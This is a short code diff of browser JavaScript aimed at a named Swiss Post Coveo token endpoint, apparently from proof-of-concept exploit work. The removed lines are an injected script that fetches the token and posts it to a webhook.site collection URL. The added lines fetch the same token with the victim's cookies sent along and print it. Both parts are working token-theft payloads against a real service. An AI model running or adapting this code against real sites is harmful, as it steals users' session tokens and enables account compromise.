@@ -1,12 +1,7 @@
-<script>
-  fetch('https://example1.post.ch/coveo/rest/token')
-    .then(response => response.text())
-    .then(data => {
-      // Replace with your webhook URL to capture data
-      fetch('https://webhook.site/5beb3f37-64a6-4b44-aa9b-372678d00ba8', {
-        method: 'POST',
-        body: JSON.stringify(data)
-      });
-    })
-    .catch(error => console.error('Error:', error));
-</script>
+fetch("https://example1.post.ch/coveo/rest/token", {
+  method: "GET",
+  credentials: "include"  // This sends cookies with the request
+})
+  .then(response => response.text())
+  .then(data => console.log(data))
+  .catch(error => console.error("Error:", error));
